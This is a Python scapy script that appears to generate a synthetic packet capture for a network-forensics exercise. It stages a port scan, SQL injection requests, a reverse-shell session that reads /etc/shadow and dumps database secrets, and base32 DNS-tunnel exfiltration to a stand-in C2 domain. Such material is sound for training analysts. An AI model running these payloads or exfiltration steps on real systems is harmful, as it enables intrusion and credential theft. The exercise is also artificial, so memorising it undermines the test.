#!/usr/bin/env python3
"""Generate a multi-stage attack PCAP for network forensics analysis."""
import base64
import random
import struct

from scapy.all import (
    IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, Ether, wrpcap, RandShort
)

random.seed(0xDEADBEEF)

ATTACKER_IP = "10.13.37.100"
VICTIM_IP = "192.168.1.50"
C2_DNS_IP = "198.51.100.53"
NORMAL_DNS = "8.8.8.8"
GATEWAY_IP = "192.168.1.1"
TUNNEL_DOMAIN = "tun.c2-ops.net"

packets = []
BASE_TIME = 1700000000.0


def ts(offset):
    return BASE_TIME + offset


# ============================================================
# Phase 0: Background ICMP (gateway pings) - noise
# ============================================================
for i in range(8):
    icmp_req = IP(src=VICTIM_IP, dst=GATEWAY_IP) / ICMP(type=8, id=0x1234, seq=i) / Raw(load=b"\x00" * 32)
    icmp_req.time = ts(i * 2.0)
    packets.append(icmp_req)

    icmp_rep = IP(src=GATEWAY_IP, dst=VICTIM_IP) / ICMP(type=0, id=0x1234, seq=i) / Raw(load=b"\x00" * 32)
    icmp_rep.time = ts(i * 2.0 + 0.003)
    packets.append(icmp_rep)

# ============================================================
# Phase 1: Normal DNS lookups (noise/baseline)
# ============================================================
normal_domains = [
    "www.google.com", "mail.google.com", "docs.google.com",
    "www.amazon.com", "api.github.com", "cdn.jsdelivr.net",
    "fonts.googleapis.com", "www.cloudflare.com",
    "update.microsoft.com", "ocsp.digicert.com",
    "ntp.ubuntu.com", "security.ubuntu.com",
    "registry.npmjs.org", "pypi.org",
]

for i, domain in enumerate(normal_domains):
    sport = random.randint(49152, 65535)
    txid = random.randint(1, 65535)
    dns_q = IP(src=VICTIM_IP, dst=NORMAL_DNS) / UDP(sport=sport, dport=53) / DNS(
        id=txid, rd=1, qd=DNSQR(qname=domain)
    )
    dns_q.time = ts(0.5 + i * 0.4)
    packets.append(dns_q)

    dns_r = IP(src=NORMAL_DNS, dst=VICTIM_IP) / UDP(sport=53, dport=sport) / DNS(
        id=txid, qr=1, aa=0, rd=1, ra=1,
        qd=DNSQR(qname=domain),
        an=DNSRR(rrname=domain, type="A",
                 rdata=f"93.184.{random.randint(1, 254)}.{random.randint(1, 254)}",
                 ttl=300),
    )
    dns_r.time = ts(0.5 + i * 0.4 + 0.035)
    packets.append(dns_r)

# ============================================================
# Phase 2: SYN scan from attacker
# ============================================================
scan_ports = [21, 22, 25, 53, 80, 110, 135, 139, 443, 445, 993, 1433,
              3306, 3389, 5432, 5900, 6379, 8080, 8443, 9090, 27017, 11211]
OPEN_PORTS = {22, 80, 3306, 8080}

for i, port in enumerate(scan_ports):
    sport = random.randint(49152, 65535)
    seq = random.randint(1000000, 9999999)
    syn = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(
        sport=sport, dport=port, flags="S", seq=seq
    )
    syn.time = ts(10 + i * 0.08)
    packets.append(syn)

    if port in OPEN_PORTS:
        sa = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(
            sport=port, dport=sport, flags="SA",
            seq=random.randint(1000000, 9999999), ack=seq + 1
        )
        sa.time = ts(10 + i * 0.08 + 0.015)
        packets.append(sa)

        rst = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(
            sport=sport, dport=port, flags="R", seq=seq + 1
        )
        rst.time = ts(10 + i * 0.08 + 0.02)
        packets.append(rst)
    else:
        ra = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(
            sport=port, dport=sport, flags="RA", seq=0, ack=seq + 1
        )
        ra.time = ts(10 + i * 0.08 + 0.015)
        packets.append(ra)

# ============================================================
# Phase 3: HTTP with SQL injection
# ============================================================
HTTP_SPORT = 51234
seq_c = 3000000
seq_s = 7000000

# TCP handshake
syn = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(sport=HTTP_SPORT, dport=80, flags="S", seq=seq_c)
syn.time = ts(15.0)
packets.append(syn)

sa = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(sport=80, dport=HTTP_SPORT, flags="SA", seq=seq_s, ack=seq_c + 1)
sa.time = ts(15.01)
packets.append(sa)

ack = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(sport=HTTP_SPORT, dport=80, flags="A", seq=seq_c + 1, ack=seq_s + 1)
ack.time = ts(15.02)
packets.append(ack)

cur_c = seq_c + 1
cur_s = seq_s + 1


def http_exchange(t_offset, request_str, response_body, status="200 OK", content_type="text/html"):
    """Add an HTTP request/response exchange to packets."""
    global cur_c, cur_s

    req_pkt = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(
        sport=HTTP_SPORT, dport=80, flags="PA", seq=cur_c, ack=cur_s
    ) / Raw(load=request_str.encode())
    req_pkt.time = ts(t_offset)
    packets.append(req_pkt)
    cur_c += len(request_str)

    resp_headers = (
        f"HTTP/1.1 {status}\r\n"
        f"Content-Type: {content_type}\r\n"
        f"Content-Length: {len(response_body)}\r\n"
        f"Server: Apache/2.4.52 (Ubuntu)\r\n"
        f"\r\n"
    )
    resp_full = resp_headers + response_body
    resp_pkt = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(
        sport=80, dport=HTTP_SPORT, flags="PA", seq=cur_s, ack=cur_c
    ) / Raw(load=resp_full.encode())
    resp_pkt.time = ts(t_offset + 0.04)
    packets.append(resp_pkt)
    cur_s += len(resp_full)


# 3a. Normal browsing
http_exchange(
    15.1,
    "GET /index.html HTTP/1.1\r\nHost: 192.168.1.50\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nAccept: text/html\r\n\r\n",
    "<html><body><h1>WebProd01 - Employee Portal</h1><form action='/search' method='get'><input name='q'/></form></body></html>"
)

# 3b. SQLi probe (boolean-based)
http_exchange(
    16.0,
    "GET /search?q=test'+OR+'1'%3d'1 HTTP/1.1\r\nHost: 192.168.1.50\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\r\nAccept: text/html\r\n\r\n",
    "<html><body><h1>Search Results</h1><div>Product Alpha</div><div>Product Beta</div><div>Product Gamma</div><div>Internal Memo</div><div>Admin Config</div><div>Payroll Q3</div></body></html>"
)

# 3c. SQLi column enumeration
http_exchange(
    17.0,
    "GET /search?q=test'+ORDER+BY+3-- HTTP/1.1\r\nHost: 192.168.1.50\r\nUser-Agent: sqlmap/1.8.4#stable\r\nAccept: */*\r\n\r\n",
    "<html><body><h1>Search Results</h1></body></html>"
)

# 3d. UNION-based extraction
http_exchange(
    18.0,
    "GET /search?q=test'+UNION+SELECT+username,password,1+FROM+users-- HTTP/1.1\r\nHost: 192.168.1.50\r\nUser-Agent: sqlmap/1.8.4#stable\r\nAccept: */*\r\n\r\n",
    "<html><body><h1>Search Results</h1><div>admin:xK9#mR2$vL5@nQ8</div><div>app_svc:Pr0d_Db_2024!</div><div>backup_usr:b4ckup_r3st0re</div><div>monitor:m0n1t0r_@gent</div></body></html>"
)

# 3e. Schema extraction
http_exchange(
    19.0,
    "GET /search?q=test'+UNION+SELECT+table_name,column_name,1+FROM+information_schema.columns+WHERE+table_schema%3ddatabase()-- HTTP/1.1\r\nHost: 192.168.1.50\r\nUser-Agent: sqlmap/1.8.4#stable\r\nAccept: */*\r\n\r\n",
    "<html><body><h1>Search Results</h1><div>users:id</div><div>users:username</div><div>users:password</div><div>secrets:id</div><div>secrets:key_name</div><div>secrets:key_value</div></body></html>"
)

# 3f. Secrets table extraction
http_exchange(
    20.0,
    "GET /search?q=test'+UNION+SELECT+key_name,key_value,1+FROM+secrets-- HTTP/1.1\r\nHost: 192.168.1.50\r\nUser-Agent: sqlmap/1.8.4#stable\r\nAccept: */*\r\n\r\n",
    "<html><body><h1>Search Results</h1><div>master_key:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2</div><div>api_token:eyJhbGciOiJIUzI1NiJ9.dGVzdA.ZjNlNjdjMQ</div></body></html>"
)

# ============================================================
# Phase 4: Reverse shell (victim connects back to attacker:4444)
# ============================================================
SHELL_ATTACKER_PORT = 4444
SHELL_VICTIM_PORT = 58302
shell_seq_v = 5000000   # victim (initiator) seq
shell_seq_a = 9000000   # attacker (listener) seq

syn = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(
    sport=SHELL_VICTIM_PORT, dport=SHELL_ATTACKER_PORT, flags="S", seq=shell_seq_v
)
syn.time = ts(22.0)
packets.append(syn)

sa = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(
    sport=SHELL_ATTACKER_PORT, dport=SHELL_VICTIM_PORT, flags="SA",
    seq=shell_seq_a, ack=shell_seq_v + 1
)
sa.time = ts(22.01)
packets.append(sa)

ack = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(
    sport=SHELL_VICTIM_PORT, dport=SHELL_ATTACKER_PORT, flags="A",
    seq=shell_seq_v + 1, ack=shell_seq_a + 1
)
ack.time = ts(22.02)
packets.append(ack)

cur_v = shell_seq_v + 1
cur_a = shell_seq_a + 1

shell_commands = [
    ("a", "id\n"),
    ("v", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n"),
    ("a", "uname -a\n"),
    ("v", "Linux webprod01 5.15.0-89-generic #99-Ubuntu SMP x86_64 GNU/Linux\n"),
    ("a", "cat /etc/hostname\n"),
    ("v", "webprod01\n"),
    ("a", "cat /etc/shadow 2>/dev/null || echo NO_ACCESS\n"),
    ("v", "root:$6$rounds=656000$rK3nF7pQ$wMxYz2AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWx:19680:0:99999:7:::\ndaemon:*:19500:0:99999:7:::\nwww-data:*:19500:0:99999:7:::\nmysql:!:19500:0:99999:7:::\n"),
    ("a", "cat /app/config/database.yml\n"),
    ("v", "production:\n  adapter: mysql2\n  host: db-internal.prod.local\n  port: 3306\n  username: app_admin\n  password: xK9#mR2$vL5@nQ8\n  database: webapp_prod\n  pool: 25\n"),
    ("a", "mysql -u app_admin -p'xK9#mR2$vL5@nQ8' -h db-internal.prod.local webapp_prod -e 'SELECT key_name,key_value FROM secrets;'\n"),
    ("v", "key_name\tkey_value\nmaster_key\ta1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2\napi_token\teyJhbGciOiJIUzI1NiJ9.dGVzdA.ZjNlNjdjMQ\n"),
    ("a", "which python3 && python3 -c 'import base64,subprocess; print(\"tunnel_ready\")'\n"),
    ("v", "/usr/bin/python3\ntunnel_ready\n"),
]

for i, (who, data) in enumerate(shell_commands):
    if who == "a":
        pkt = IP(src=ATTACKER_IP, dst=VICTIM_IP) / TCP(
            sport=SHELL_ATTACKER_PORT, dport=SHELL_VICTIM_PORT,
            flags="PA", seq=cur_a, ack=cur_v
        ) / Raw(load=data.encode())
        pkt.time = ts(23 + i * 0.5)
        packets.append(pkt)
        cur_a += len(data)
    else:
        pkt = IP(src=VICTIM_IP, dst=ATTACKER_IP) / TCP(
            sport=SHELL_VICTIM_PORT, dport=SHELL_ATTACKER_PORT,
            flags="PA", seq=cur_v, ack=cur_a
        ) / Raw(load=data.encode())
        pkt.time = ts(23 + i * 0.5)
        packets.append(pkt)
        cur_v += len(data)

# ============================================================
# Phase 5: DNS tunneling - data exfiltration
# ============================================================
EXFIL_DATA = (
    "EXFIL_START|"
    "hostname=webprod01|"
    "db_user=app_admin|"
    "db_pass=xK9#mR2$vL5@nQ8|"
    "shadow_root=$6$rounds=656000$rK3nF7pQ$wMxYz2AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMnOpQrStUvWx|"
    "master_key=a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2|"
    "api_token=eyJhbGciOiJIUzI1NiJ9.dGVzdA.ZjNlNjdjMQ|"
    "EXFIL_END"
)

encoded = base64.b32encode(EXFIL_DATA.encode()).decode().rstrip("=").lower()

CHUNK_SIZE = 30
chunks = [encoded[i:i + CHUNK_SIZE] for i in range(0, len(encoded), CHUNK_SIZE)]

# Interleave with more normal DNS
interleave_domains = [
    "www.reddit.com", "i.redd.it", "api.twitter.com", "t.co",
    "static.cloudflareinsights.com", "analytics.google.com",
    "ajax.googleapis.com", "gravatar.com", "cdn.shopify.com",
    "unpkg.com", "stackpath.bootstrapcdn.com", "use.fontawesome.com",
    "maxcdn.bootstrapcdn.com", "code.jquery.com",
]

tunnel_start_time = 35.0
t = tunnel_start_time

for i, chunk in enumerate(chunks):
    # Sprinkle normal DNS noise (roughly every 2-3 tunnel queries)
    if i % 2 == 0 and (i // 2) < len(interleave_domains):
        domain = interleave_domains[i // 2]
        sport = random.randint(49152, 65535)
        txid = random.randint(1, 65535)
        nq = IP(src=VICTIM_IP, dst=NORMAL_DNS) / UDP(sport=sport, dport=53) / DNS(
            id=txid, rd=1, qd=DNSQR(qname=domain)
        )
        nq.time = ts(t)
        packets.append(nq)

        nr = IP(src=NORMAL_DNS, dst=VICTIM_IP) / UDP(sport=53, dport=sport) / DNS(
            id=txid, qr=1, rd=1, ra=1,
            qd=DNSQR(qname=domain),
            an=DNSRR(rrname=domain, type="A",
                     rdata=f"151.101.{random.randint(1, 254)}.{random.randint(1, 254)}",
                     ttl=300),
        )
        nr.time = ts(t + 0.025)
        packets.append(nr)
        t += 0.15

    # DNS tunnel query: <seq>-<base32chunk>.tun.c2-ops.net
    tunnel_label = f"{i:02d}-{chunk}"
    tunnel_fqdn = f"{tunnel_label}.{TUNNEL_DOMAIN}"
    sport = random.randint(49152, 65535)
    txid = random.randint(1, 65535)

    tq = IP(src=VICTIM_IP, dst=C2_DNS_IP) / UDP(sport=sport, dport=53) / DNS(
        id=txid, rd=1, qd=DNSQR(qname=tunnel_fqdn, qtype="A")
    )
    tq.time = ts(t)
    packets.append(tq)

    # C2 response: A record 127.0.0.1 with TTL=0 (beacon ack)
    tr = IP(src=C2_DNS_IP, dst=VICTIM_IP) / UDP(sport=53, dport=sport) / DNS(
        id=txid, qr=1, aa=1, rd=1, ra=0,
        qd=DNSQR(qname=tunnel_fqdn, qtype="A"),
        an=DNSRR(rrname=tunnel_fqdn, type="A", rdata="127.0.0.1", ttl=0),
    )
    tr.time = ts(t + 0.04)
    packets.append(tr)

    t += 0.25

# ============================================================
# Phase 6: More background traffic after exfil (cover tracks)
# ============================================================
cover_domains = [
    "www.wikipedia.org", "en.wikipedia.org", "upload.wikimedia.org",
    "www.stackoverflow.com", "cdn.sstatic.net",
]
for i, domain in enumerate(cover_domains):
    sport = random.randint(49152, 65535)
    txid = random.randint(1, 65535)
    q = IP(src=VICTIM_IP, dst=NORMAL_DNS) / UDP(sport=sport, dport=53) / DNS(
        id=txid, rd=1, qd=DNSQR(qname=domain)
    )
    q.time = ts(t + 2 + i * 0.3)
    packets.append(q)

    r = IP(src=NORMAL_DNS, dst=VICTIM_IP) / UDP(sport=53, dport=sport) / DNS(
        id=txid, qr=1, rd=1, ra=1,
        qd=DNSQR(qname=domain),
        an=DNSRR(rrname=domain, type="A",
                 rdata=f"91.198.{random.randint(1, 254)}.{random.randint(1, 254)}",
                 ttl=3600),
    )
    r.time = ts(t + 2 + i * 0.3 + 0.03)
    packets.append(r)

# ============================================================
# Sort and write
# ============================================================
packets.sort(key=lambda p: p.time)
wrpcap("/app/capture.pcap", packets)
print(f"Generated PCAP with {len(packets)} packets")
print(f"DNS tunnel chunks: {len(chunks)}")
print(f"Exfil data length: {len(EXFIL_DATA)} chars, encoded: {len(encoded)} chars")
